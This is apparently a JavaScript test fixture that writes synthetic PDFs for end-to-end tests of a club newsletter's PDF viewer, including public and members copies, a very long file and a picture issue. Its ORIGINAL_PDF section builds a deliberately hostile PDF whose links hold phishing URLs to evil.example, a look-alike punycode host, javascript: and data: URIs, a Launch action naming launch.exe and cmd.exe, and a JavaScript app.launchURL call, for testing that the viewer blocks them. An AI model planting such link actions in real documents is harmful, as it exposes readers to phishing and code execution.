// @ts-check
// PDFVIEW: made-up PDFs for the stand-in API (e2e/api.mjs), never a real issue. Each page has a filled
// band of colour (so a drawn canvas is never blank), lines of text in Helvetica (so the text layer
// has words to find) and link annotations as the copies carry them: a URI action to
// https://nwflmensa.us/out/<id> with /Contents "Link to <host>", or a link to another page. Written
// by hand, uncompressed, with a correct cross-reference table; this file only writes PDFs.

/** @param {string} text */
const literal = (text) => `(${text.replace(/[\\()]/g, (c) => `\\${c}`)})`;

/**
 * A link: a URI action (uri), a link to another page (toPage), or any other action as the PDF writes it
 * (action, e.g. "<< /S /Launch /F (...) >>"), for the hostile original below.
 * @typedef {{ rect: [number, number, number, number], uri?: string, toPage?: number, action?: string, contents?: string }} Link
 * A picture (READER2): a block of red over a block of blue, `rect` [x, y, width, height] in points.
 * @typedef {{ lines: string[], fill: [number, number, number], links?: Link[], picture?: [number, number, number, number] }} SyntheticPage
 */

/** The picture's pixels: 16 x 16, the top half pure red, the bottom half pure blue (RGB, 8 bits). */
const PICTURE = Buffer.from(Array.from({ length: 16 * 16 }, (_, i) => (i < 128 ? [255, 0, 0] : [0, 0, 255])).flat()).toString('latin1');

/**
 * @param {{ pages: SyntheticPage[], comment?: string }} spec
 * @returns {Buffer}
 */
export function syntheticPdf({ pages, comment = '' }) {
  /** @type {string[]} */
  const objects = [];
  const add = (/** @type {string} */ body) => objects.push(body);
  // 1 catalog, 2 page tree, 3 font; then each page: its page object, its content, its picture, its links.
  const pageRefs = pages.map((_, i) => 4 + pages.slice(0, i).reduce((n, p) => n + 2 + (p.picture ? 1 : 0) + (p.links?.length ?? 0), 0));
  add('<< /Type /Catalog /Pages 2 0 R >>');
  add(`<< /Type /Pages /Kids [${pageRefs.map((r) => `${r} 0 R`).join(' ')}] /Count ${pages.length} >>`);
  add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>');
  pages.forEach((page, i) => {
    const ref = /** @type {number} */ (pageRefs[i]);
    const links = page.links ?? [];
    const first = ref + 2 + (page.picture ? 1 : 0);
    const annots = links.map((_, k) => `${first + k} 0 R`).join(' ');
    const pictures = page.picture ? ` /XObject << /Im1 ${ref + 2} 0 R >>` : '';
    add(`<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >>${pictures} >> /Contents ${ref + 1} 0 R${annots ? ` /Annots [${annots}]` : ''} >>`);
    const [r, g, b] = page.fill;
    const text = page.lines.map((line, k) => `${k === 0 ? '72 700 Td' : '0 -40 Td'} ${literal(line)} Tj`).join('\n');
    // Each link underlined, as a reader sees a link.
    const boxes = links.map(({ rect: [x1, y1, x2] }) => `${x1} ${y1 + 4} ${x2 - x1} 2 re`).join('\n');
    const picture = page.picture ? `q ${page.picture[2]} 0 0 ${page.picture[3]} ${page.picture[0]} ${page.picture[1]} cm /Im1 Do Q\n` : '';
    const stream = `q ${r} ${g} ${b} rg 36 560 540 200 re f Q\n${picture}q 0 0 0.6 rg ${boxes ? `${boxes}\nf` : ''} Q\nBT /F1 28 Tf 0 0 0 rg\n${text}\nET\n`;
    add(`<< /Length ${Buffer.byteLength(stream, 'latin1')} >>\nstream\n${stream}endstream`);
    if (page.picture) add(`<< /Type /XObject /Subtype /Image /Width 16 /Height 16 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Length ${PICTURE.length} >>\nstream\n${PICTURE}\nendstream`);
    for (const link of links) {
      const action =
        link.action !== undefined ? `/A ${link.action}` : link.uri !== undefined ? `/A << /S /URI /URI ${literal(link.uri)} >>` : `/Dest [${pageRefs[/** @type {number} */ (link.toPage)]} 0 R /Fit]`;
      add(`<< /Type /Annot /Subtype /Link /Rect [${link.rect.join(' ')}] /Border [0 0 0] ${action}${link.contents ? ` /Contents ${literal(link.contents)}` : ''} >>`);
    }
  });
  let out = `%PDF-1.7\n${comment ? `${comment}\n` : ''}`;
  /** @type {number[]} */
  const offsets = [];
  objects.forEach((body, i) => {
    offsets.push(Buffer.byteLength(out, 'latin1'));
    out += `${i + 1} 0 obj\n${body}\nendobj\n`;
  });
  const xref = Buffer.byteLength(out, 'latin1');
  out += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}`;
  out += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(out, 'latin1');
}

/** Where the copies' links point: the production origin, as the worker writes them. */
const OUT = 'https://nwflmensa.us/out/';

/**
 * The newest issue's public copy (the stand-in's LINK_FILE): three pages, with the links of
 * e2e/stand-in.ts LINKS where the API says they are (web on page 2, social and mail on page 1, the
 * turned-off one on page 3), and a link on page 1 to page 3.
 */
export const PUBLIC_ISSUE_PDF = syntheticPdf({
  pages: [
    {
      lines: ['Pensa Mensa', 'Public copy, page 1', 'Our group on Facebook', 'Write to the events desk', 'Go to page 3'],
      fill: [0.85, 0.93, 0.95],
      links: [
        { rect: [72, 612, 460, 652], uri: `${OUT}outsocialaaaaaaaaaaaaaaaaa`, contents: 'Link to www.facebook.com' },
        { rect: [72, 572, 460, 612], uri: `${OUT}outmailaaaaaaaaaaaaaaaaaaa`, contents: 'Link to example.org' },
        { rect: [72, 532, 300, 572], toPage: 2 },
      ],
    },
    {
      lines: ['Public copy, page 2', 'The picnic is on Saturday'],
      fill: [0.95, 0.9, 0.8],
      links: [{ rect: [72, 652, 500, 692], uri: `${OUT}outwebaaaaaaaaaaaaaaaaaaaa`, contents: 'Link to club.example' }],
    },
    {
      lines: ['Public copy, page 3', 'A link that was turned off'],
      fill: [0.9, 0.85, 0.95],
      links: [{ rect: [72, 652, 500, 692], uri: `${OUT}outoffaaaaaaaaaaaaaaaaaaaa`, contents: 'Link to parked.example' }],
    },
  ],
});

/**
 * The newest issue's members copy: two pages; `mark` is the stand-in's members-copy comment.
 *
 * @param {string} mark
 */
export const membersIssuePdf = (mark) =>
  syntheticPdf({
    comment: mark,
    pages: [
      { lines: ['Pensa Mensa', 'Members copy, page 1'], fill: [0.93, 0.9, 0.97] },
      { lines: ['Members copy, page 2'], fill: [0.9, 0.95, 0.9] },
    ],
  });

/**
 * PDFVIEW fix 1 (B1), after the challenger's hostile PDF: an original as an officer is served it, with
 * its own links to an outside host of every kind pdf.js turns into an address (a URI to https, http,
 * mail, a script, data, a look-alike host, a protocol-relative one; a Launch, a GoToR and a JavaScript
 * app.launchURL), an /out/<id> on another origin and behind a user name, and two that must still work:
 * a copy's /out/<id> and a link to page 2. Each link's /Contents is its name; the rows are 40 pt apart.
 */
/** The original's file id: the stand-in API serves it to an officer only, as the API serves an original. */
export const ORIGINAL_ID = 'f4000000-0000-4000-8000-0000000000e1';
export const OUTSIDE_LINKS = /** @type {const} */ ([
  ['OUT-HTTPS', '<< /S /URI /URI (https://evil.example/phish) >>'],
  ['OUT-HTTP', '<< /S /URI /URI (http://evil.example/plain) >>'],
  ['OUT-MAILTO', '<< /S /URI /URI (mailto:x@example.com?subject=hi) >>'],
  ['OUT-JSURI', '<< /S /URI /URI (javascript:alert\\(1\\)) >>'],
  ['OUT-DATA', '<< /S /URI /URI (data:text/html,<b>x</b>) >>'],
  ['OUT-PUNY', '<< /S /URI /URI (https://xn--nwflmnsa-r1a.us/x) >>'],
  ['OUT-PROTOREL', '<< /S /URI /URI (//evil.example/proto) >>'],
  ['OUT-JSLAUNCH', '<< /S /JavaScript /JS (app.launchURL\\("https://evil.example/launchurl", true\\)) >>'],
  ['OUT-LAUNCH', '<< /S /Launch /F (https://evil.example/launch.exe) /Win << /F (cmd.exe) >> >>'],
  ['OUT-GOTOR', '<< /S /GoToR /F (https://evil.example/remote.pdf) /D [0 /Fit] >>'],
]);
/** The /out/<id> links in the original, each only this site's leaving page whatever origin it names. */
export const ORIGINAL_OUT = /** @type {const} */ ([
  ['OUT-COPY', 'https://nwflmensa.us/out/outwebaaaaaaaaaaaaaaaaaaaa'],
  ['OUT-EVILOUT', 'https://evil.example/out/outwebaaaaaaaaaaaaaaaaaaaa'],
  ['OUT-USERINFO', 'https://nwflmensa.us@example.com/out/outwebaaaaaaaaaaaaaaaaaaaa'],
]);
const rows = [...OUTSIDE_LINKS.map(([name, action]) => ({ contents: name, action })), ...ORIGINAL_OUT.map(([name, uri]) => ({ contents: name, uri }))];
/** Where each link is on page 1, in PDF points from the bottom left: a row 30 pt high, 40 pt apart. */
export const linkRect = (/** @type {number} */ k) => /** @type {[number, number, number, number]} */ ([72, 740 - 40 * (k + 1), 540, 770 - 40 * (k + 1)]);
export const ORIGINAL_PDF = syntheticPdf({
  pages: [
    {
      lines: ['An original, with its own links'],
      fill: [0.95, 0.95, 0.85],
      links: [...rows.map((row, k) => ({ ...row, rect: linkRect(k) })), { rect: linkRect(rows.length), toPage: 1, contents: 'IN-ISSUE' }],
    },
    { lines: ['Page 2 of the original'], fill: [0.85, 0.95, 0.85] },
  ],
});

/** The long file's id, and its pages: the stand-in API serves it to anyone. */
export const LONG_ID = 'f5000000-0000-4000-8000-000000005000';
export const LONG_PAGES = 5000;

/**
 * PDFVIEW fix 1 (S1): a file of `count` pages, every page the same small one, far past what the
 * reader draws (viewer.js MAX_PAGES); each page an object of its own sharing one content stream.
 *
 * @param {number} count
 */
export function longPdf(count) {
  const stream = 'BT /F1 28 Tf 72 700 Td (A page of a very long file) Tj ET\n';
  const objects = ['<< /Type /Catalog /Pages 2 0 R >>', '', '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>', `<< /Length ${stream.length} >>\nstream\n${stream}endstream`];
  const first = objects.length + 1;
  for (let i = 0; i < count; i++) objects.push('<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 3 0 R >> >> /Contents 4 0 R >>');
  objects[1] = `<< /Type /Pages /Kids [${Array.from({ length: count }, (_, i) => `${first + i} 0 R`).join(' ')}] /Count ${count} >>`;
  let out = '%PDF-1.7\n';
  /** @type {number[]} */
  const offsets = [];
  objects.forEach((body, i) => {
    offsets.push(out.length);
    out += `${i + 1} 0 obj\n${body}\nendobj\n`;
  });
  const xref = out.length;
  out += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}`;
  out += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(out, 'latin1');
}

/**
 * READER2: an issue with pictures, served to anyone (as the long file is) and listed nowhere. Page 1 has
 * text and a photo (red over blue), so dark pages can be seen to recolour the page and leave the photo;
 * page 2 is a scan, one picture over the whole page and no text, for search's "No searchable text".
 */
export const PICTURE_ID = 'f6000000-0000-4000-8000-000000006000';
export const PICTURE_PDF = syntheticPdf({
  pages: [
    { lines: ['A page with a photo', 'The photo keeps its colours'], fill: [0.85, 0.93, 0.95], picture: [72, 160, 300, 300] },
    { lines: [], fill: [1, 1, 1], picture: [0, 0, 612, 792] },
  ],
});
